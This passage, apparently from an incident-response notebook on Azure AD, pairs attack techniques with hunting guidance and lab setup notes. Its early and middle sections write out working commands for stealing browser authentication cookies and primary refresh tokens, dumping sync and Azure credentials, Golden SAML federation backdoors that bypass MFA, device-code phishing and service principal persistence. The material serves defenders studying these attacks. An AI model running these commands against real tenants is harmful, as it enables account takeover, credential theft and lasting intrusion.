PS> Get-AADIntLoginInformation -Domain <DOMAIN> 
PS> Invoke-AADIntReconAsOutsider -DomainName <DOMAIN> | Format-Table
```

A python tool to look at [detailed federation information](https://github.com/WillOram/AzureAD-incident-response/blob/main/azureadrecon.py). 

## Authenticated reconnaissance against Azure AD 

```
roadrecon auth [-h] [-u USERNAME] [-p PASSWORD] [-t TENANT] [-c CLIENT] [--as-app] [--device-code] [--access-token ACCESS_TOKEN] [--refresh-token REFRESH_TOKEN] [-f TOKENFILE] [--tokens-stdout]
roadrecon gather
roadrecon gui
```

## Using a compromised workstation to gain access to cloud identities and data 

### Stealing the persistent authentication cookie from a compromised workstation

Remote environment 

```
Copy-Item "$Env:localappdata\Google\Chrome\User Data\Default\Cookies" .\tmp\

Add-Type -AssemblyName System.Security
$localState = Get-Content "$Env:localappdata\Google\Chrome\User Data\Local State" | ConvertFrom-Json
$encryptedKey = [convert]::FromBase64String($localState.os_crypt.encrypted_key)
$chromeMasterKey = [System.Security.Cryptography.ProtectedData]::Unprotect(($encryptedKey | Select-Object -Skip 5), $null, 'CurrentUser')
[convert]::ToBase64String($chromeMasterKey) > .\tmp\chromeMasterKey
```

Local env

```
Function Convert-ByteArrayToHex {
    [cmdletbinding()]
    param(
        [parameter(Mandatory=$true)]
        [Byte[]]
        $Bytes
    )
    $HexString = [System.Text.StringBuilder]::new($Bytes.Length * 2)
    ForEach($byte in $Bytes){
        $HexString.AppendFormat("{0:x2}", $byte) | Out-Null
    }
    $HexString.ToString()
}

$base64MasterKey = Get-Content .\chromeMasterKey
$encryptedKey = Convert-ByteArrayToHex ([convert]::FromBase64String($base64MasterKey))
$cookiePath = (Resolve-Path Cookies).Path 
.\SharpChrome.exe  cookies /target:$cookiePath /statekey:$encryptedKey /cookie:"ESTSAUTHPERSISTENT" /format:json
```

### Obtaining a refresh token from a compromised workstation

* [Background on browser SSO](https://docs.microsoft.com/en-us/azure/active-directory/devices/concept-primary-refresh-token#browser-sso-using-prt)
* [Journey to Azure AD PRT: Getting access with pass-the-token and pass-the-cert](https://o365blog.com/post/prt/)
* [Abusing Azure AD SSO with the Primary Refresh Token](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/)
* [Digging further into the Primary Refresh Token](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)
* [Requests AAD Refresh Token](https://github.com/leechristensen/RequestAADRefreshToken)

Key steps (user context):
* Request a PRT cookie and exchange for a (the PRT cookie expired after about 35 minutes)
* Request a refresh and access token from a Public application using a OAuth2 authorization code flow (the refresh token is valid for 90 days by default)  

### Stealing the primary refresh token from a compromised workstation 

* [Pass the PRT](https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/) 

Key steps (local admin required):
* Extract PRT from LSASS
* Extract the Session Key and decrypt with DPAPI (TPM)
* Create a PRT cookie and exchange for a session cookie 

```
dsregcmd.exe /status
mimikatz.exe privilege::debug sekurlsa::cloudap
token::elevate dpapi::cloudapkd /keyvalue:[PASTE ProofOfPosessionKey HERE] /unprotect
```

### Dumping clear text credentials to authenticate to cloud services
* Useful if domain account is a high-privilege cloud account
* Enable WDigest with [Invoke-WdigestDowngrade.ps1](https://github.com/HarmJ0y/Misc-PowerShell/blob/master/Invoke-WdigestDowngrade.ps1)
* If MFA is required credentials could potentially be used through a proxy when Conditional Access policies not configured to require MFA from trusted locations 
* Check [MFASweep](https://github.com/dafthack/MFASweep)

## Using a compromised AD domain to gain access to cloud identities and data 

### Stealing or modify token-signing certificates to perform a Golden SAML attack

* Stealing token-signing certificates from on-premises ADFS servers to forge SAML tokens "Golden SAML" attack. 
* Allows anyone with the certificate to impersonate any user to Azure AD. 
* Can steal token-signing certificates to ADFS or add an alternative token-signing certificate
* [Export Active Directory Federation Services (AD FS) Token Signing Certificate](https://github.com/Azure/SimuLand/blob/main/3_simulate_detect/credential-access/exportADFSTokenSigningCertificate.md)
* [FireEye Azure AD backdoors](https://www.fireeye.com/blog/threat-research/2020/09/detecting-microsoft-365-azure-active-directory-backdoors.html)

Export ADFS configuration: 
```
PS> $ADFS = Get-WmiObject -Namespace root/ADFS -Class SecurityTokenService  
PS> $conn = $ADFS.ConfigurationDatabaseConnectionString  
PS> $SQLclient = new-object System.Data.SqlClient.SqlConnection -ArgumentList $conn  
PS> $SQLclient.Open()  
PS> $SQLcmd = $SQLclient.CreateCommand()  
PS> $SQLcmd.CommandText = "SELECT ServiceSettingsData from IdentityServerPolicy.ServiceSettings"  
PS> $SQLreader = $SQLcmd.ExecuteReader()  
PS> $SQLreader.Read() | Out-Null  
PS> $settings=$SQLreader.GetTextReader(0).ReadToEnd()  
PS> $SQLreader.Dispose()  
PS> \[xml\]$xml=$settings  
```
ADFSDump https://github.com/fireeye/ADFSDump

### Compromising the AZUREADSSOACC account to forge Kerberos tickets

* [https://o365blog.com/post/on-prem_admin/](https://o365blog.com/post/on-prem_admin/)
* Dump the hash for the account AZUREADSSOACC using dcsync or from NTDS.DIT
* Forge Kerberos tickets for users synced with Azure AD 

### Setting the password for an account in privileged cloud groups

* Compromise Azure AD connector account (stored in a local configuration database)
* [https://o365blog.com/post/on-prem_admin/](https://o365blog.com/post/on-prem_admin/)

```
$creds = Get-AADIntSyncCredentials
Get-AADIntAccessTokenForAADGraph -Credentials $creds -SaveToCache
Get-AADIntSyncObjects | Select UserPrincipalName,SourceAnchor,CloudAnchor | Sort UserPrincipalName
Set-AADIntUserPassword ...
```

Using a compromised AD sync accounts [I'm in your cloud tenant](https://dirkjanm.io/assets/raw/Im%20in%20your%20cloud%20bluehat-v1.0.pdf)
* Dump all on-premise password hashes (if PHS is enabled)
• Log in on the Azure portal (since it’s a user)
• Bypass conditional access policies for admin accounts
• Add credentials to service principals
• Modify service principals properties
• Modify/backdoor/remove conditional access policies (internal API)

### Dumping clear text credentials to accounts in privileged cloud groups
* Credential dumping and lateral movement
* DCsync / NTDTS etc. 
* If MFA is required credentials could potentially be used through a proxy when Conditional Access policies not configured to require MFA from trusted locations 
* Check [MFASweep](https://github.com/dafthack/MFASweep)

## Using a compromised cloud global admin account gain access to on-prem 

* [Death from above](https://posts.specterops.io/death-from-above-lateral-movement-from-azure-to-on-prem-ad-d18cb3959d4d)

## Using a compromised third-party to gain access to cloud identities and data 

* Stealing the certificates used for service principals (see the attack against Mimecast)

## Using phishing attacks to gain access to cloud identities and data 

* [Introducing a new phishing technique for compromising Office 365 accounts](https://o365blog.com/post/phishing/)
* [The art of the device code phish](https://0xboku.com/2021/07/12/ArtOfDeviceCodePhish.html)
* The user code is valid only for 15 minutes

```
> Get-AzureToken -Client Graph
> RefreshTo-MSGraphToken -refreshToken $response.refresh_token -domain <DOMAIN> -Device iPhone -Browser Safari
> Dump-OWAMailboxViaMSGraphApi -AccessToken $MSGraphToken.access_token -mailFolder inbox -top 1 -Device iPhone -Browser Safari
```

Uses Microsoft Office client id d3590ed6-52b3-4102-aeff-aad2292ab01c

### Consent grant phishing attack

* todo

## Using password spraying to cloud accounts

* [MSOLSpray](https://github.com/dafthack/MSOLSpray)

## Gaining persistent access to cloud identities and data 

### Creating a new Service Principals to provide long-term API-based access 

```
PS> Get-AzureADServicePrincipal -all $true | Where-Object{$\_.KeyCredentials -ne $null}  
PS> $sp = New-AzADServicePrincipal -DisplayName 'MicrosoftSyncShare'  
PS> New-AzureADServicePrincipalKeyCredential -objectid $sp.ObjectId -EndDate "01-01-2022 12:00:00" -StartDate "01-03-2021 14:12:00" -CustomKeyIdentifier "Test" -Type AsymmetricX509Cert -Usage Verify -Value $keyValue  
```

### Adding credentials to an existing new Service Principals to provide long-term API-based access

```
PS> $cert = New-SelfSignedCertificate -dnsname some.domain.com -CertStoreLocation cert:\LocalMachine\My -Provider “Microsoft Enhanced RSA and AES Cryptographic Provider”  
PS> $keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())   
PS> $sp = get-azureadserviceprincipal -searchstring SEARCHSTRING  
PS> New-AzureADServicePrincipalKeyCredential -objectid $sp.ObjectId -EndDate "01-01-2022 12:00:00" -StartDate "01-03-2021 14:12:00" -CustomKeyIdentifier "Test" -Type AsymmetricX509Cert -Usage Verify -Value $keyValue  
PS> Connect-AzureAD  -Tenant TENANTID -ApplicationID APPID -CertificateThumbprint CERTTHUMBPRINT  
```

Creates the Azure AD audit log event "Add service principal credentials"

```
PS> New-AzureADServicePrincipalPasswordCredential -objectid $sp.ObjectId -EndDate "01-01-2030 12:00:00" -StartDate "04-04-2020 12:00:00"  -Value PASSWORD  
```
Creates the Azure AD audit log event "Add service principal credentials"

### Configuring new or modifying existing federation trusts to perform Golden SAML attacks

* Adding new federation trusts to or modifying existing federation trusts to add new token-signing certificates, to forge SAML authentication tokens

```
PS> Get-AADIntAccessTokenForAADGraph -savetocache                                                                       
PS> ConvertTo-AADIntBackdoor -domain maliciousdomain.com     
PS> get-msoluser | select UserPrincipalName, ImmutableId  
PS> Open-AADIntOffice365Portal -ImmutableID $id -UseBuiltInCertificate -ByPassMFA $true -Issuer ISSUER  
```
Creates the Azure AD audit log event "Set domain authentication"

```
PS> Get-MSOLUser | Where-Object{$\_.DisplayName -eq 'Will'} | select UserPrincipalName, ImmutableId  
PS> Get-MsolDomainFederationSettings -DomainName $domainname | Select IssuerUri  
PS> Get-MsolDomainFederationSettings -DomainName $domainname | Select *  
PS> Set-MsolDomainFederationSettings -DomainName $domainname -NextSigningCertificate $malicious_cert  
PS> Get-MsolDomainFederationSettings -DomainName $domainname | Select *  
PS> Open-AADIntOffice365Portal -ImmutableID $id -UseBuiltInCertificate -ByPassMFA $true -Issuer $issueruri  
```

AuditLogs | where OperationName =~ "Set federation settings on domain"

### Joining a fake device to Azure AD

* [Journey to Azure AD PRT: Getting access with pass-the-token and pass-the-cert](https://o365blog.com/post/prt/)

```
Join-AADIntDeviceToAzureAD -DeviceName "My computer" -DeviceType "Commodore" -OSVersion "C64"
$prtKeys = Get-AADIntUserPRTKeys -PfxFileName .\d03994c9-24f8-41ba-a156-1805998d6dc7.pfx
```

### Dumping credentials for Azure resources

* [Microburst] (https://github.com/NetSPI/MicroBurst)
* [Get-AzPassword](https://www.netspi.com/blog/technical/cloud-penetration-testing/a-beginners-guide-to-gathering-azure-passwords/)
* [Azure PrivEsc](https://www.youtube.com/watch?v=OES9RU0WTH0&ab_channel=DEFCONConference)

```
Import-Module Microburst.psm1
Get-AzurePasswords
Get-AzurePasswords -Verbose | Out-GridView
```
### Modify conditional access to add in MFA trusted IPs

## Pass the certificate

* [Azure AD Pass The Certificate](https://medium.com/@mor2464/azure-ad-pass-the-certificate-d0c5de624597)

## Hunting for backdoors 

* Audit federation trusts
* Audit service principal credentials, permissions and reply URLs
* Audit conditional access rules 
* Hunt for suspicious AD Sync account logons 
* Hunt for modifications to conditional access rules 
* Hunt for suspicious sign-ins by service principals (Using AADServicePrincipalSignInLogs logs. Requires additional configuration to be sent to Sentinel)
* Hunt for service principals accessing users' mailboxes (MailItemsAccessed log is enabled by default for users that are assigned an Office 365 or Microsoft 365 E5 license or for organizations with a Microsoft 365 E5 Compliance add-on subscription. The MailItemsAccessed mailbox auditing action covers all mail protocols: POP, IMAP, MAPI, EWS, Exchange ActiveSync, and REST.)


```
PS> Install-module AzureADPreview -AllowClobber
PS> Connect-AzureAD  

PS> Install-module ExchangeOnlineManagement  
PS> Connect-ExchangeOnline  

PS> Install-module MSOnline  
PS> Connect-MsolService  

PS> Install-Module AZ
PS> Connect-AzAccount

PS> # CISA's Sparrow  
PS> Invoke-WebRequest 'https://github.com/cisagov/Sparrow/raw/develop/Sparrow.ps1' -OutFile 'Sparrow.ps1' -UseBasicParsing   
PS> .\Sparrow.ps1  

PS> # CrowdStrike's Azure Reporting Tool (CRT)  
PS> Invoke-WebRequest 'https://github.com/CrowdStrike/CRT/raw/main/Get-CRTReport.ps1' -OutFile 'Get-CRTReport.ps1' -UseBasicParsing  
PS> .\Get-CRTReport.ps1  

PS> # AzureHound  
PS> Invoke-WebRequest 'https://raw.githubusercontent.com/BloodHoundAD/AzureHound/master/AzureHound.ps1' -OutFile 'AzureHound.ps1' -UseBasicParsing  
PS> . .\AzureHound.ps1  
PS> Invoke-AzureHound  

PS> # Hawk
PS> Install-module hawk
PS> start-hawktenantinvestigation  
```

### Commands to manually audit federation trusts

**Azure AD**

PS> Get-MsolDomain | Format-List 
PS> Get-AzureADDomain | Format-List (newer version of the command above)
PS> Get-MsolFederationProperty -DomainName ******* | Format-List

**Exchange Online** (unclear if these can be changed, Exchange Online PowerShell APIs to configure these state they only work for on-prem Exchange)

PS> Get-FederationTrust | Format-List
PS> Get-FederatedOrganizationIdentifier -IncludeExtendedDomainInfo  | Format-List
PS> Get-FederatedOrganizationIdentifier -IncludeExtendedDomainInfo | select-object -expandproperty Domains  

### Commands to manually audit service principals

* CISA Sparrow script provides the best data for this
* Audit the creation and use of credentials for service principal. 
* Review the permissions assigned to service principles. 
* Audit the assignment of credentials to applications that allow non-interactive sign-in by the application and permissions for the Microsoft Graph API.
* Look for unusual application usage, such as use of dormant applications.

#### Review service principals with credentials 

```
PS> Get-AzureADServicePrincipal  
PS> Get-AzureADServicePrincipal -all $true | Where-Object{$\_.KeyCredentials -ne $null} | Select *  
PS> Get-AzureADServicePrincipal -all $true | Where-Object{$\_.PasswordCredentials -ne $null} | Select *   
```

### Review service principals with credentials and risky permissions 

See scripts output in Sparrow and CRT tool.  

```
PS> # Get Service Principal using objectId  
PS> $sp = Get-AzureADServicePrincipal -ObjectId "OBJECTID"    

PS> # Get Azure AD App role assignments using objectID of the Service Principal (users)  
PS> $assignments = Get-AzureADServiceAppRoleAssignment -ObjectId $sp.ObjectId -All $true   

PS> # Get all delegated permissions for the service principal  
PS> $spOAuth2PermissionsGrants = Get-AzureADOAuth2PermissionGrant -All $true| Where-Object {$\_.clientId -eq $sp.ObjectId} | Format-List  

PS> # Get all application permissions for the service principal  
PS> $spApplicationPermissions = Get-AzureADServiceAppRoleAssignedTo -ObjectId $sp.ObjectId -All $true | Where-Object { $\_.PrincipalType -eq "ServicePrincipal" }

PS> # Get all application permissions to Microsoft Graph for the service principal  
PS> $spApplicationPermissions = Get-AzureADServiceAppRoleAssignedTo -ObjectId $sp.ObjectId -All $true | Where-Object {$\_.DisplayName -eq "Microsoft Graph"}    

PS> # Look up Microsoft Graph permissions    
PS> $GraphSP = Get-AzureADServicePrincipal -All $true | Where-Object {$\_.DisplayName -eq "Microsoft Graph"}    
PS> $GraphAppRoles = $GraphSP.AppRoles | Select-Object -Property AllowedMemberTypes, Id, Value    
PS> $GraphAppRoles| Where-Object {$\_.Id -eq "e2a3a72e-5f79-4c64-b1b1-878b674786c9" -or $\_.Id -eq "810c84a8-4a9e-49e6-bf7d-12d183f40d01"}    
```

App permissions reference https://docs.microsoft.com/en-us/graph/permissions-reference   

List of risky app permissions https://github.com/mepples21/azureadconfigassessment  

Creat a test app https://docs.microsoft.com/en-gb/azure/active-directory/develop/quickstart-v2-javascript   

Microsoft blog references Mail.Read and Mail.ReadWrite

Mimecast: Mimecast ask organisations to add an application/service principal to Azure AD and add a certificate to that service principal, allowing Mimecast to authenticate to it. They then ask organisations to assign that service principal the permissions __full_access_as_app__ to __Office 365 Exchange Online__. See: https://community.mimecast.com/s/article/Creating-an-Office-365-Association-for-Server-Connections-1061681132

### Further hunting 

* [Crowdstrike blog on hunting for modifications](https://www.crowdstrike.com/blog/crowdstrike-launches-free-tool-to-identify-and-help-mitigate-risks-in-azure-active-directory/) There is a good list in here of what to search for in Azure AD that goes further than the above including:
  * Reviewing trust relationships with partners including IT consultants, vendors and resellers 
  * Reviewing Azure AD allowed identity providers (SAML IDPs through direct federation or social logins)
  * Reviewing Azure B2B external identities’ access to the Azure portal 
  * Review environment for overly privileged service accounts that may have access to Azure  
 
Use of token-signing certificates to spoof SAML tokens. Azure AD UserAuthenticationMethod: 16457 indicates a password with MFA was satisfied by a federated identity provider: https://twitter.com/ItsReallyNick/status/1349536271010574338?s=20

## Notes on building a lab

* Purchase a test domain name. 
* Use Let's Encrypt to issue a wildcard certificate for the domain name. 
* Configure an Azure AD tenant and configure the domain as a custom domain. 
* Deploy three Windows Servers in Azure, and one test workstation. 
* Setup one of the Windows Servers as a domain controller, use the same domain name as previously registered. 
* Domain join all the other systems (after configuring the DC as the DNS server for the VNet). 
* Use AD Connect to configure federation with Azure AD, including configuring the ADFS server and the WAP. 
* Configure 443 access to the WAP from the internet.
* Configure Azure Sentinel, onboard the security logs from all systems and the Azure AD audit logs. 
* Configure the diagnostic settings for Azure AD to collect all logs data types. 
* Enable audit logging in the Security & Compliance Center. 
* Create and configure a test application in Azure AD, configure Mail.Read permissions. Use the web application quick-start to log-in test users to the app and require them to consent access to their data. 
* Create and configure a test application in Azure AD, configure Mail.Read permissions. Grant [admin consent](https://docs.microsoft.com/en-us/azure/active-directory/manage-apps/grant-admin-consent) to the application. 
